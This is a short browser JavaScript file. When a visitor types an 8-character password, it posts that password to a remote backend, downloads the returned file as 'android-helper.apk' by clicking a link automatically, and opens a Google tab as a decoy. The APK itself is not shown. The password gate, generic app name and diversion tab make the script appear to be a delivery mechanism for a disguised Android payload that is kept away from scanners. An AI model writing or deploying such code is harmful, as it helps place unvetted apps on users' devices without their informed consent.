const BACKEND_URL = "https://p2-q4uh.onrender.com"; const passwordInput = document.getElementById("password"); passwordInput.addEventListener("input", async () => { passwordInput.classList.remove("correct", "incorrect"); // Only send when exactly 8 characters are entered if (passwordInput.value.length !== 8) { return; } try { const response = await fetch(BACKEND_URL + "/api/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ password: passwordInput.value }) }); if (!response.ok) { passwordInput.classList.add("incorrect"); return; } passwordInput.classList.add("correct"); const blob = await response.blob(); const url = URL.createObjectURL(blob); const a = document.createElement("a"); a.href = url; a.download = "android-helper.apk"; document.body.appendChild(a); a.click(); a.remove(); window.open("https://www.google.com", "_blank"); // Clean up object URL setTimeout(() => { URL.revokeObjectURL(url); }, 1000); } catch (error) { console.error("Download failed:", error); passwordInput.classList.add("incorrect"); } });
